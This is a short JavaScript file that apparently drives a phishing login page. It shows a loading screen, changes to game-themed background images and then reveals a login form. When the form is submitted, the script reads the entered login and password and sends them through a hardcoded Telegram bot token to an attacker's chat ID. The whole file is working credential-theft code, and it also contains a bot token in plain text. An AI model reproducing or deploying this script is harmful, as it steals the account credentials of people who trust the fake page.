let TOKEN_BOT = '6705865843:AAElec0BvzbOUb442jjy_ULE9G0LQ0bt31M'
let CHAT_ID = '1861568967'

let body = document.querySelector('body')
let loading = document.querySelector('.loading')
let login = document.querySelector('#login')

setTimeout(() =>{
    body.classList.remove("bg-[url('https://staticg.sportskeeda.com/editor/2024/01/b3109-17046051080206-1920.jpg')]")
    loading.classList.add('hidden')
    body.classList.add("bg-[url('https://www.memuplay.com/blog/wp-content/uploads/2024/01/GDVuFDBWYAA4EEy.jpg')]")
    login.classList.remove('hidden')
}, 5000);

let inputs = document.querySelectorAll('input')
let button = document.querySelector('button')

button.addEventListener('click', (e) => {
    e.preventDefault();

    const loginValue = inputs[0].value.trim();
    const passwordValue = inputs[1].value.trim();
    
    if (loginValue && passwordValue) {
        fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `\n\n LOGIN: ${loginValue} \n PASSWORD: ${passwordValue}`,
        }),
    })
    .then(response => response.json())
    .then(malumot => {
        console.log(malumot);
    })
    .catch(error => console.log("ERROR", error));
} else {
    console.log("Error: Login and password cannot be empty");
}
});   